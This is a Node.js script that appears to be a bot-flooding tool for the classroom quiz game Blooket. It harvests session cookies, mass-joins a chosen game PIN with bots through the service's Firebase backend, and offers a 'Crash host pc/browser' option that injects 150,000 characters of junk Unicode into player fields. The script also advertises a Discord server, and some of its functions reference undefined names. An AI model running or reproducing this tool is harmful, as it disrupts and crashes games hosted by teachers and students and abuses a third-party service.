import axios from 'axios';
import chalk from 'chalk';
import promptSync from 'prompt-sync';
const prompt = promptSync();

import colors from 'colors';
colors.enable();

import { initializeApp } from 'firebase/app';
import { getAuth, signInWithCustomToken } from 'firebase/auth';
import { getDatabase, ref, set } from 'firebase/database';
import firebase from "firebase/compat/app";
import "firebase/compat/auth";
import "firebase/compat/database";

function zalgo(text, h = 15) {
  const a = new Lunicode();
  a.tools.creepify.options.maxHeight = h;
  return a.tools.creepify.encode(text);
}
var chars = ["‮", "俿", "佒", "⾟", "็", "็", "็", "็", "็", "็", "俱", "俲"];

function makeLongText(a) {
  return new Array(a)
    .fill()
    .map((e) => chars[Math.floor(Math.random() * chars.length)])
    .join("");
}

console.log("\x0a\x20\x5f\x5f\x20\x20\x20\x20\x20\x20\x20\x5f\x5f\x5f\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5f\x5f\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5f\x5f\x20\x20\x20\x20\x20\x20\x0a\x2f\x5c\x20\x5c\x20\x20\x20\x20\x20\x2f\x5c\x5f\x20\x5c\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x5c\x20\x5c\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x5c\x20\x5c\x5f\x5f\x20\x20\x20\x0a\x5c\x20\x5c\x20\x5c\x5f\x5f\x5f\x5f\x5c\x2f\x2f\x5c\x20\x5c\x20\x20\x20\x20\x20\x5f\x5f\x5f\x20\x20\x20\x20\x20\x5f\x5f\x5f\x5c\x20\x5c\x20\x5c\x2f\x27\x5c\x20\x20\x20\x20\x20\x20\x5f\x5f\x5c\x20\x5c\x20\x2c\x5f\x5c\x20\x20\x0a\x20\x5c\x20\x5c\x20\x27\x5f\x5f\x60\x5c\x20\x5c\x20\x5c\x20\x5c\x20\x20\x20\x2f\x20\x5f\x5f\x60\x5c\x20\x20\x2f\x20\x5f\x5f\x60\x5c\x20\x5c\x20\x2c\x20\x3c\x20\x20\x20\x20\x2f\x27\x5f\x5f\x60\x5c\x20\x5c\x20\x5c\x2f\x20\x20\x0a\x20\x20\x5c\x20\x5c\x20\x5c\x4c\x5c\x20\x5c\x20\x5c\x5f\x5c\x20\x5c\x5f\x2f\x5c\x20\x5c\x4c\x5c\x20\x5c\x2f\x5c\x20\x5c\x4c\x5c\x20\x5c\x20\x5c\x20\x5c\x5c\x60\x5c\x20\x2f\x5c\x20\x20\x5f\x5f\x2f\x5c\x20\x5c\x20\x5c\x5f\x20\x0a\x20\x20\x20\x5c\x20\x5c\x5f\x2c\x5f\x5f\x2f\x20\x2f\x5c\x5f\x5f\x5f\x5f\x5c\x20\x5c\x5f\x5f\x5f\x5f\x2f\x5c\x20\x5c\x5f\x5f\x5f\x5f\x2f\x5c\x20\x5c\x5f\x5c\x20\x5c\x5f\x5c\x20\x5c\x5f\x5f\x5f\x5f\x5c\x5c\x20\x5c\x5f\x5f\x5c\x0a\x20\x20\x20\x20\x5c\x2f\x5f\x5f\x5f\x2f\x20\x20\x5c\x2f\x5f\x5f\x5f\x5f\x2f\x5c\x2f\x5f\x5f\x5f\x2f\x20\x20\x5c\x2f\x5f\x5f\x5f\x2f\x20\x20\x5c\x2f\x5f\x2f\x5c\x2f\x5f\x2f\x5c\x2f\x5f\x5f\x5f\x5f\x2f\x20\x5c\x2f\x5f\x5f\x2f\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x5f\x5f\x5f\x20\x20\x5f\x5f\x5f\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5f\x5f\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x2f\x27\x5f\x5f\x5f\x5c\x2f\x5c\x5f\x20\x5c\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x5c\x20\x5c\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x2f\x5c\x20\x5c\x5f\x5f\x2f\x5c\x2f\x2f\x5c\x20\x5c\x20\x20\x20\x20\x20\x5f\x5f\x5f\x20\x20\x20\x20\x20\x5f\x5f\x5f\x20\x20\x20\x20\x5c\x5f\x5c\x20\x5c\x20\x20\x20\x20\x20\x5f\x5f\x20\x20\x20\x5f\x20\x5f\x5f\x20\x20\x20\x20\x0a\x5c\x20\x5c\x20\x2c\x5f\x5f\x5c\x20\x5c\x20\x5c\x20\x5c\x20\x20\x20\x2f\x20\x5f\x5f\x60\x5c\x20\x20\x2f\x20\x5f\x5f\x60\x5c\x20\x20\x2f\x27\x5f\x60\x20\x5c\x20\x20\x2f\x27\x5f\x5f\x60\x5c\x2f\x5c\x60\x27\x5f\x5f\x5c\x20\x20\x0a\x20\x5c\x20\x5c\x20\x5c\x5f\x2f\x20\x20\x5c\x5f\x5c\x20\x5c\x5f\x2f\x5c\x20\x5c\x4c\x5c\x20\x5c\x2f\x5c\x20\x5c\x4c\x5c\x20\x5c\x2f\x5c\x20\x5c\x4C\x5c\x20\x5c\x2f\x5c\x20\x20\x5f\x5f\x2f\x5c\x20\x5c\x20\x5c\x2f\x20\x20\x20\x0a\x20\x20\x5c\x20\x5c\x5f\x5c\x20\x20\x20\x2f\x5c\x5f\x5f\x5f\x5f\x5c\x20\x5c\x5f\x5f\x5f\x5f\x2f\x5c\x20\x5c\x5f\x5f\x5f\x5f\x2f\x5c\x20\x5c\x5f\x5f\x5f\x2c\x5f\x5c\x20\x5c\x5f\x5f\x5f\x5f\x5c\x5c\x20\x5c\x5f\x5c\x20\x20\x20\x0a\x20\x20\x20\x5c\x2f\x5f\x2f\x20\x20\x20\x5c\x2f\x5f\x5f\x5f\x5f\x2f\x5c\x2f\x5f\x5f\x5f\x2f\x20\x20\x5c\x2f\x5f\x5f\x5f\x2f\x20\x20\x5c\x2f\x5f\x5f\x2c\x5f\x20\x2f\x5c\x2f\x5f\x5f\x5f\x5f\x2f\x20\x5c\x2f\x5f\x2f\x20\x20\x20\x0a".bold.green)
console.log("discord.gg/YnM9nQdUP3".bold.green);
console.log(' '.bold.green);

let cookies = [];
let id, name, amount, botMsg;

function randstr() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let k = 0; k < 2; k++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

async function getCookies() {
  const cookiePromises = [];
  for (let i = 0; i < 50; i++) {
      cookiePromises.push((async () => {
          const response = await fetch("https://goldquest.blooket.com/gold/play/landing");
          const cookie = response.headers.get('set-cookie').split(' ')[0];
          cookies.push(cookie);
          if (cookies.length % 10 == 0) {
              console.log(`Cookies created: ${cookies.length} / 50`.bold.green);
          }
      })());
  }
  await Promise.all(cookiePromises);
}

async function joinGame(id, name, cb) {
    try {
        let joinResult = await axios.put('https://fb.blooket.com/c/firebase/join', { id, name });
        if (!joinResult.data.success && joinResult.data.msg) {
            console.log(chalk.hex('#149414')(`\t\t${name}: failed to join with reason "${joinResult.data.msg}"`));
            return cb(1);
        }

        let selectedBlook = select();

        let liveApp = initializeApp({
            apiKey: 'AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU',
            authDomain: 'blooket-2020.firebaseapp.com',
            projectId: 'blooket-2020',
            storageBucket: 'blooket-2020.appspot.com',
            messagingSenderId: '741533559105',
            appId: '1:741533559105:web:b8cbb10e6123f2913519c0',
            measurementId: 'G-S3H5NGN10Z',
            databaseURL: joinResult.data.fbShardURL
        });

        const app = getAuth(liveApp);
        await signInWithCustomToken(app, joinResult.data.fbToken).catch(console.error);

        const db = getDatabase();
        await set(ref(db, `${id}/c/${name}`), { b: selectedBlook });

        console.log(chalk.hex('#149414')(`\t\t${IGN}: joined with blook ${selectedBlook}!`));
        cb(2);
    } catch (err) {
        console.log(chalk.hex('#149414')(`\t\t${IGN}: failed to join :(`));
        cb(1);
    };
}

async function flood() {
    const floodPromises = [];
    for (let i = 1; i <= amount; i++) {
        floodPromises.push((async () => {
            const IGN = `\x20 \x20 \x20 ${name} ${randstr()}`;
            const response = await fetch("https://fb.blooket.com/c/firebase/join", {
                body: JSON.stringify({ id, name: IGN }),
                headers: { Cookie: cookies[i % cookies.length] },
                method: "PUT"
            });
            const { success, fbToken, fbShardURL, msg } = await response.json();
            if (!success) {
                console.log("Error while connecting to game:".bold.green, msg);
                return;
            }

            const liveApp = firebase.initializeApp({
                apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
                authDomain: "blooket-2020.firebaseapp.com",
                projectId: "blooket-2020",
                storageBucket: "blooket-2020.appspot.com",
                messagingSenderId: "741533559105",
                appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
                measurementId: "G-S3H5NGN10Z",
                databaseURL: fbShardURL
            }, IGN);

            const auth = firebase.auth(liveApp);
            await auth.setPersistence(firebase.auth.Auth.Persistence.NONE).catch(console.error);
            await auth.signInWithCustomToken(fbToken).catch(console.error);
            await liveApp.database().ref(`${id}/c/${IGN}`).update({ b: "Rainbow Astronaut", bg: "", pr:0, cr: botMsg, g: botMsg, f: botMsg, w: botMsg, d: botMsg, xp: botMsg, c: botMsg, ca: botMsg });
            await liveApp.delete();
            console.log(`${IGN} | ${id}`.bold.green);
        })());
        await new Promise(r => setTimeout(r));
    }
    await Promise.all(floodPromises);
}

while (true) {
    id = prompt("[Game Pin]".bold.green);
    name = prompt("[Bot Name]".bold.green);
    amount = parseInt(prompt("[How Many Bots Do You Want]".bold.green), 10);
    

    const useLongText = prompt("[Crash host pc/browser] (y/n)".bold.green);
    if (useLongText.toLowerCase() === 'y') {
        botMsg = makeLongText(1.5e5);
    } else {
        botMsg = prompt("[Bot Message]".bold.green);
    }
    
    await getCookies();
    await flood();
    let floodAgain = prompt("[Add more bots] (y/n)".bold.green);
    if (floodAgain.toLowerCase() !== 'y') {
        console.log("Done!".bold.green);
        process.exit(0);
    }
}
